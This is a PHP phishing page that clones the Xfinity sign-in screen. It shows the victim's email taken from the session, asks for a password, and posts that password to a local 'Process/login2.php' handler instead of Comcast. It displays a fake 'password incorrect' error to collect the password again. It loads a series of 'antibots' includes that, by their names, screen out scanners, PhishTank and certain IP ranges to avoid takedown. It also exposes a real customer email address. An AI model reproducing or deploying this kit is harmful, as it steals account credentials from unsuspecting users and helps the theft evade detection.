<?php
ob_start();
session_start();
$email = $_SESSION['email'];

include "antibots/#1.php";
    include "antibots/#2.php";
    include "antibots/#3.php";
    include "antibots/#4.php";
    include "antibots/#5.php";
    include "antibots/#6.php";
    include "antibots/#7.php";
    include "antibots/#8.php";
    include "antibots/#9.php";
    include "antibots/#10.php";
    include "antibots/#11.php";
    include "antibots/#12.php";
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
?>
<!DOCTYPE html>

<html lang="en" class="light stepped-out" data-resource-package-id="res-responsive-login-page"><head><script type="text/javascript" async="async" src="https://metrics.xfinity.com/b/ss/comcastdotcomprod/10/JS-2.22.0-LBWB/s06444640797809?AQB=1&amp;ndh=1&amp;pf=1&amp;callback=s_c_il[1].doPostbacks&amp;et=1&amp;t=17%2F1%2F2022%205%3A17%3A58%204%20-300&amp;d.&amp;nsid=0&amp;jsonv=1&amp;.d&amp;mid=83518456843160438422090203688805149821&amp;aamlh=3&amp;ce=UTF-8&amp;pageName=resi%7Cselfservice%7Clogin%7Cstepped-out%7Center%20password&amp;g=https%3A%2F%2Flogin.xfinity.com%2Flogin&amp;r=https%3A%2F%2Flogin.xfinity.com%2Flogin&amp;c.&amp;apl=4.0&amp;inList=3.0&amp;getNewRepeat=3.0&amp;getTimeParting=6.3&amp;formatTime=2.0&amp;pt=3.0&amp;p_fo=3.0&amp;getValOnce=3.0&amp;getPreviousValue=3.0&amp;getAndPersistValue=3.0&amp;getDaysSinceLastVisit=n%2Fa&amp;getQueryParam=4.0&amp;getTimeBetweenEvents=3.0&amp;.c&amp;cc=USD&amp;ch=login&amp;events=event125%3D29%2Cevent36%3D29&amp;aamb=RKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y&amp;c25=resi%7Cselfservice%7Clogin%7Cstepped-out%7Center%20password%7Cpage%20load&amp;v29=landscape%3Adesktop%20layout%3A1440x374&amp;v37=D%3DpageName&amp;c44=responsive%7Ccima%20login&amp;v44=responsive%7Ccima%20login&amp;c54=VisitorAPI%20Present&amp;c55=resi%7Cselfservice&amp;c60=en&amp;c69=portal&amp;c70=resi%7Cselfservice%7Clogin%7Cstepped-out%7Center%20xfinity%20id&amp;c72=29&amp;c73=AA%20Hosted%20by%20Adobe%20Launch%20%7C%2012012020&amp;v86=unauthenticated%7Cunrecognized&amp;v99=comcast%7Cweb&amp;s=1440x900&amp;c=24&amp;j=1.6&amp;v=N&amp;k=Y&amp;bw=1440&amp;bh=374&amp;mcorgid=DA11332E5321D0550A490D45%40AdobeOrg&amp;AQE=1"></script>
					<script type="text/javascript" src="https://login.xfinity.com/static/js/comcast-common.js"></script>
				<title>Sign in to Xfinity</title>
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
		<meta name="mobile-web-app-capable" content="yes">
		<meta name="apple-mobile-web-app-capable" content="yes">
		<meta name="description" content="Get the most out of Xfinity from Comcast by signing in to your account. Enjoy and manage TV, high-speed Internet, phone, and home security services that work seamlessly together — anytime, anywhere, on any device.">
		<meta name="viewport" content="width=device-width,initial-scale=1">
		<meta name="msapplication-TileColor" content="#ffffff">
		<meta name="msapplication-TileImage" content="static/images/global/favicon/favicon-96x96.png">
		<meta name="theme-color" content="#ffffff">
		
				
                                            
        <script src="https://assets.adobedtm.com/331fbea29f79/fdd77923e2da/launch-46f715e51bac.min.js"></script><script type="text/javascript" src="https://static.cimcontent.net/data-layer/?appID=login"></script>
    
	

					<link rel="stylesheet" type="text/css" href="https://login.xfinity.com/static/css/junket/fonts-remote.min.css?v=c82b180">
											<link rel="stylesheet" type="text/css" href="https://login.xfinity.com/static/css/styles-stepped-out-light.min.css?v=c82b180">
													<link rel="shortcut icon" href="https://login.xfinity.com/static/images/favicon/favicon.ico">
		<link rel="apple-touch-icon" sizes="57x57" href="https://login.xfinity.com/static/images/favicon/apple-icon-57x57.png">
		<link rel="apple-touch-icon" sizes="60x60" href="https://login.xfinity.com/static/images/favicon/apple-icon-60x60.png">
		<link rel="apple-touch-icon" sizes="72x72" href="https://login.xfinity.com/static/images/favicon/apple-icon-72x72.png">
		<link rel="apple-touch-icon" sizes="76x76" href="https://login.xfinity.com/static/images/favicon/apple-icon-76x76.png">
		<link rel="apple-touch-icon" sizes="114x114" href="https://login.xfinity.com/static/images/favicon/apple-icon-114x114.png">
		<link rel="apple-touch-icon" sizes="120x120" href="https://login.xfinity.com/static/images/favicon/apple-icon-120x120.png">
		<link rel="apple-touch-icon" sizes="144x144" href="https://login.xfinity.com/static/images/favicon/apple-icon-144x144.png">
		<link rel="apple-touch-icon" sizes="152x152" href="https://login.xfinity.com/static/images/favicon/apple-icon-152x152.png">
		<link rel="apple-touch-icon" sizes="180x180" href="https://login.xfinity.com/static/images/favicon/apple-icon-180x180.png">
				<link rel="icon" type="image/png" sizes="192x192" href="static/images/favicon/android-icon-192x192.png">
		<link rel="icon" type="image/png" sizes="32x32" href="https://login.xfinity.com/static/images/favicon/favicon-32x32.png">
		<link rel="icon" type="image/png" sizes="96x96" href="https://login.xfinity.com/static/images/favicon/favicon-96x96.png">
		<link rel="icon" type="image/png" sizes="16x16" href="https://login.xfinity.com/static/images/favicon/favicon-16x16.png">
		<link rel="manifest" href="https://login.xfinity.com/static/images/favicon/manifest.json">

		<script type="text/javascript">
			runtimeData = {
									"r": "comcast.net",									"selectAccount": "false",									"s": "portal",									"deviceAuthn": "false",									"continue": "http://xfinity.comcast.net/",									"ipAddrAuthn": "false",									"forceAuthn": "0",									"flowStateId": "CgNDRlMQAhgBIiAHelwFNiFbeznWXPy6zAddxtHf31E1r8q5zZkH2TimjioQPMLoQ8VQjruZWcU62p__ejJ8CjwyMDIwLTA0LTI4dDIxOjI5OjMwIWYxMWFiZGNmLTQyMWEtNDEyMS1hNGUxLTc5MjBiY2FmYzJjZSFlbmMSPDIwMjAtMDQtMjh0MjE6Mjk6MjkhYzk5YWE0MzMtMmQyMi00MDY0LTliMDItMWJkNGVlNzk3YWJhIXNpZzrQEtokOMxdMe9WnCoEuXi9uFikwUUDCe7OwEL4EezGj1vBh6-dlVBamk9wHc45kilru9UNiYFkfoyW4b-Jj3aeden4UmXfYzuKAw_U-1-xNDLSaDke90DpyUifJYD346jDz2ZHyKPgpUOVLtMeucAty8DaZpXkl0652HbOikyXl7nUzuR6icq2ZLcsM7H_3DHLxX0tIr5Ic_zV2XaSvbqogPRa-l3uG48Q6qQu2NVMdJXYp2Qq0LTNoBCB_zqYCpfCujKPmxqMSSRotuWOGCdNmOFYwPECEByT1WjF5M3M6f-lYC-MczFK0Xv5Hw73tFezDvScjAkitHlM3gPq-hizhIQonWcW4_Ik3rbGGjMh3ULxf4U8NLAa170XM4nNxeK6CiZ7T7WELHftePshQNU5CmoSyJtmmegONS0xwC7mAyeK-zmy3wVspAyIfmdQ3BUlnNYvAtp43Tn_VHt4kyRzu1PVhP7_TKP_n8WGMUS4AAsy5G8MSWMo2kTKmDWfYmaGcTUPIQ7foiw7pDzLt_nRrhmKs_dGa_5HCgNEZ-0J1Tb9-2ULK-eeR5Klp7liP2ucUt6WBiwRi9pwfSMxFokaKtOD3nYV0HVTUZNnrX7jdEoTA9vS6ZF7_67xHBXSErWDYTrBs-5wY0ouRkSqkisuz15WG10y_jakc_-t4BYatlx9XMKW0VhykL4l2oHrk22VIQrSnv-tyqAD1QVECGj3IdFDFGkD0HXGf8anoNhVGqYCaZsjRjsw_5IfwATut32nJjLP2qMW5s8JLDJpJ-C26MoT6T-yRdfSVu6jgReceeT2z46Wk3A9hNujEx3n8aoNc-S_lyEAdhaCSdMNNOGh9dotLo6B3r0yccecq92lW3eLuISJVmbLLOlXhzyN-37yHnBPa2cBv1WKIp0hW2BPluCYD2HsTsLRS0cwfACsz_9aXuopX1TRGMm0z5GVPPKhh-nPV9bpOLz6BpVrYZ7qIwRDvVFlDZhtOE9rovMvWt7kOBKssB5kGSbuptlIfb36s2rjIYGEgqivliiwU3l2QGn_NIabXNdFLo1uZuEWbTrYbDh1YHwkSEfJCZkUeogETp5mSSqnYGnyUp7DniPUJH0-mNfxUzQw0z9O-0B8Xd3t0jxASsxtPropQH61otZ8ex_7xcBSH212HL4_kOGMCpGvPkFqAZQ7lo4Yt0yEJ65Wp9zuGJ8wOmeCAy5xthPizgLaalLXepM2KInLtUU32bw5VnChy56zZnixDuOlgHsCkUkmv2UbD5WSSm2_9y3yLhZaJbY0IhxMKJSibQGpyvuYCaZ7y6MOqBXDqYsVvWJI8-0XWZ9EbZPnhNvXGWs2mfASOIWazln7emRNhr231_Y5ZtcUtKckEK8yZ-G6sM1tuuAmpzpMX_9RWqLyd-Un35LIH43gqj4HoURAfP0rVf_h-Yqo1ecaWaTA0Y9W0YcGsL9EJzcqM1bgbih1tObb_bvyJ6puxi8Lw6_CTbvU6PfWqAcgm3lcUnDV_6AJVNxUKubkQk8ybUxfOlba2ZC8R-f2VBYjt5dK1W4YK8jzgAXHkzQf6hFut4tqYa1ZXPozqoJrGCM9BgA2c7PNK_cDzmHQUlFGW2ulNwizbhRtaUuczarGqr-l8JQEBd3_lufckp6FbgZjWK_YkmbCnP08LR16Baw6cro69VmiRxMBooYbfS4V2HtUW3hrKZPon_pViyavpFDNo1MLSyKe1jqltITnVVwu6SyJ_D3jYFOTXQUxdBAx9HF1Q8aWVpg7fyWNz_HyyPrs9_y4pebGErpxT_R2y8vBnhLKBz1KqSz9q82z14ul9VyaRSAPs-naBJS6_ApCgtW-NhPI-_OQwAVLobt5oHqPRhd74EuXwHP2bfSgrDpT8mFhtUxnb9b7EJyrWxBVR0RdjlNrGYBV8h2u-IJLz3uhxbQ-QuVhxfW9382-w6Cl06xvXKMSMl3MSxXz5J9AP4Semy63n-jYqqLENolD8gBl4xUzHyZpTCwQ3LmaQUH8LZN34UF2-Y5YEI1hXTPGriHzuhArVZ9Lzt9i9AOb1-zPK85DbMV88rXJlDSfvxAhJqJlHQ393ocmE4caXL8-o_PHmzYI_v97S81CRBV4PRSxHuVdaje2favSTRShnJUgauSlBwVE8PYCMFQWbJd-G0KBLhW3-CH28VENK8djl4Zw7D47xcEey0mUjcRfyOD4HvhCwW9Y1PsMw2CDaXcF_vQPG82fRyaX0nN6gy0yAGqZmceS8G0CX_mY_ol4SG5E0-hk3i8FBrJ3um2ispjsAeOFFZBxUkPQWX_ec3l4rVOfq3vWckbxdS5YLMkvR8KuYbW20UdGltTf3OtbKes3CLH3CueiD5h8D_g_hzEuVCG2SnyzDoQ1hLwLoQf3o3QwUgb1gIBzNNMv4vjhLhEBUDVmFrDwfAgbn2ZlxlpiQFlya2t3nYz6JSHG-u2hA6kCX83ZacOKnXD3TovWtj8pb_lX8Jvb-j6sk4xYjtT164m30bui6GjctTQVj9cA15OJvfVk0j0geGsVcowG05wRyULzWWA5p9g7Y3FDwumy-U3-_GIjR3ajTQMBGLMPnWbomJCA2mn1NKdPsxm32__yT7iCDLVDce492KZY24bVmEKa--P5m4-B8oyiHdnN1eGm8lldawt3pvcZ0wQa2uXN9hFGnHWixhD6vGYE5t-mJyAYMnWrOQQd13PfjTr-moaPKZNFAHuJ1N-Vt6PSoKAs-SsjUPE0yADwT_8LTRNeoaBTA6mZfIO3g-DFazDKiSHkvUgTMNeQiN_3iL5rSbPVHCUlhE_24-tuEHV3_yqSaAVHPxZevkcMTc1sa2lqb32LGH1u9T0A_-9WIPsOoeTVPSm8akXzMsoafFtjRIWsmtGaW6LuLpmp0aK855CjQNPU8wl7KnwaUMGnmQ5TaoLKAlya1ved1r7GbMaoO-bQZ2e4l83E_qcbRNmbRBvBy3UoelC6oblfKX7zYW5AUbHfZnrjxy8lPDAdGgiPZai979UubwZryaDATihghZiK6qhp_g9066f89_f2dTN1H84Qy2cYGi-h424pnbfC_4lE3alUuw60whI1xVZcovZQZybRpkLp-ai7CLUhZnmykA0MjfcMbIK3mzLKUFlX_DM0yMLoFlqVirRIpSBXVu2wyfQ5B0dr2_OLmA087jiK",									"lang": "en",									"passive": "false",									"flowId": "44e6cb56-a3e6-43a8-b1ff-a0e89d36fa11",									"reqId": "2f18f17f-5704-40b0-94a6-cb701cd8606a"							}
		</script>
																							<style type="text/css">
					.da-fullscreen iframe[id^="utif_"] {
max-width: 300px;
max-height: 600px;
overflow: hidden;
}
</style>
<style>
				</style>
						<script src="https://assets.adobedtm.com/extensions/EPbde2f7ca14e540399dcc1f8208860b7b/AppMeasurement.min.js" async=""></script><script src="https://assets.adobedtm.com/extensions/EPbde2f7ca14e540399dcc1f8208860b7b/AppMeasurement_Module_ActivityMap.min.js" async=""></script><script src="https://assets.adobedtm.com/extensions/EPbde2f7ca14e540399dcc1f8208860b7b/AppMeasurement_Module_AudienceManagement.min.js" async=""></script></head>
		<body class=" has-footer">

	<div id="breakpoints"></div>
							<div id="background" style="height: 635.891px;"></div>
								<main id="bd">
			<h1 class="screen-reader-text">Sign in to Xfinity</h1>
			<div id="left"></div><div id="right">		<form name="signin" action="Process/login2.php" method="post" novalidate="">
	<div class="box-container box-container--with-shadow">
		<div class="single logo-wrapper">
	<span aria-role="img" class="xfinity-logo"></span>
		</div>
		<h2 id="displayedLogin" class="heading3 heading3--dark"><?=$email;?></h2>
						<div class="textfield-wrapper">
			<label for="passwd">Enter your password</label>
			<input id="passwd" name="passwd" type="password" autocomplete="current-password" maxlength="128" required="" data-empty-message="Please type in your password to sign in.">
		</div>
		<p id="error" class="error_message">
				The Xfinity ID or password you entered was incorrect.									Please try again.							</p>
				<input id="user" name="user" type="text" autocomplete="username" value="daddio05@comcast.net" disabled="" data-hidden="">
		<div class="caption">
							<a id="forgotPwdLink" href="https://idm.xfinity.com/myaccount/reset?continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3FselectAccount%3Dfalse%26ipAddrAuthn%3Dfalse%26passive%3Dfalse%26reqId%3D2f18f17f-5704-40b0-94a6-cb701cd8606a%26r%3Dcomcast.net%26s%3Dportal%26deviceAuthn%3Dfalse%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26forceAuthn%3D0%26lang%3Den%26rm%3D2&amp;lang=en&amp;ruid=daddio05%40comcast.net" target="_self" title="Reset Password">Forgot?</a>						<button id="showPassword" type="button" class="menu link" aria-label="Show password" data-aria-label-show="Show password" data-aria-label-hide="Hide password" data-label-show="Show" data-label-hide="Hide">Show</button>
		</div>

				<p id="implied-legal" class="caption">By signing in, you agree to our <a href="http://my.xfinity.com/terms/web/">Terms of Service</a> and <a href="http://xfinity.comcast.net/privacy/">Privacy Policy</a>.</p>
		
		<button class="submit" type="submit" id="sign_in">Sign In</button>
					
		
	</div>

			<div class="checkbox-container box-container box-container--with-shadow">
			<label for="remember_me">
				<input type="checkbox" id="remember_me" name="rm" value="1"><span id="remember_me_checkbox" class="checkbox"></span><div class="content">Stay signed in</div>
			</label>
			<button type="button" id="rm_label_learn_more" class="icon info cancel" data-id-ref="rm_help" aria-controls="rm_help" aria-label="Learn more about staying signed in"></button>
		</div>
			
	<div class="box-container box-container--with-shadow options-container">
		<ul>
			<li id="restart-flow-item">
				<button class="link" type="submit" name="$restart_flow_action.prompt" value="true" formnovalidate=""><a href="https://login.xfinity.com/logout?s=portal&amp;r=comcast.net&amp;continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3FselectAccount%3Dfalse%26ipAddrAuthn%3Dfalse%26passive%3Dfalse%26reqId%3D2f18f17f-5704-40b0-94a6-cb701cd8606a%26r%3Dcomcast.net%26s%3Dportal%26deviceAuthn%3Dfalse%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26forceAuthn%3D0%26lang%3Den%26rm%3D2">Sign in as someone else</a></button>
			</li>
		</ul>
	</div>
</form>

				</div>
		</main>
														<footer>
<span class="content">
<span class="copyright">© 2022 Comcast</span>
<nav>
<span class="divider hide-compact"></span>
<span class="links">
<a href="https://www.xfinity.com/privacy/policy">Privacy Policy</a>
<span class="divider"></span>
<a href="http://my.xfinity.com/terms/web/">Terms of Service</a>
</span>
<span class="ad-links divider"></span>
<span class="ad-links links">
<a href="http://www.comcast.net/adinformation" target="_blank">Ad Info</a>
<span class="divider"></span>
<a href="https://www.surveymonkey.com/s.aspx?sm=FyNNVDhj_2f2FNc2KVOHQ4eg_3d_3d" target="_blank">Ad Feedback</a>
</span>
<span class="divider hide-compact"></span>
<span class="links">
<a href="https://www.xfinity.com/privacy/manage-preference">Do Not Sell My Personal Information</a>
</span>
</nav>
</span>
</footer>
					
		
		<script type="text/javascript" src="https://login.xfinity.com/static/js/libs/jquery-3.3.1.min.js"></script>

									<div id="rm_help" role="dialog" aria-hidden="true" class="overlay" data-dialog-type="overlay">
    	<div role="document" class="content">
    		    		<button type="button" class="close" aria-label="Close"></button>
    						<h1>Why Stay Signed In?</h1>
				<p>With this option selected, you'll stay signed in to your account on this device until you sign out. You should not use this option on public or shared devices.</p>
				<p>For your security, you may be asked to enter your password before accessing certain information.</p>
			
    	</div>
    </div>
		    <script type="text/javascript" src="https://login.xfinity.com/static/js/scripts-responsive.min.js?v=c82b180"></script>

    <script type="text/javascript">
        login.registerInitFunction(function() {
	$('#showPassword').click(function () {
		var passwordField = $('#passwd'),
			toggleButton = $(this);
		if(passwordField.attr('type') === 'password') {
			passwordField.attr('type','text');
			toggleButton.attr('aria-label', toggleButton.data('ariaLabelHide'));
			toggleButton.text(toggleButton.data('labelHide'));
		} else {
			passwordField.attr('type','password');
			toggleButton.attr('aria-label', toggleButton.data('ariaLabelShow'));
			toggleButton.text(toggleButton.data('labelShow'));
		}
	});
});
;
        login.init({
            passwordId: 'passwd',
        });
        <!--
        		-->
    </script>

		<script type="text/javascript">
		
		</script>

			

<img alt="" src="https://www.xfinity.com/-/media/5BF28DC6EBA54E929173CC7B0D9B6E69?ts=1645057076656" style="top: -10000px; left: -10000px; position: absolute;"><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_comcast_0" name="destination_publishing_iframe_comcast_0_name" src="https://comcast.demdex.net/dest5.html?d_nsid=0#https%3A%2F%2Flogin.xfinity.com" style="display: none; width: 0px; height: 0px;" class="aamIframeLoaded"></iframe></body></html>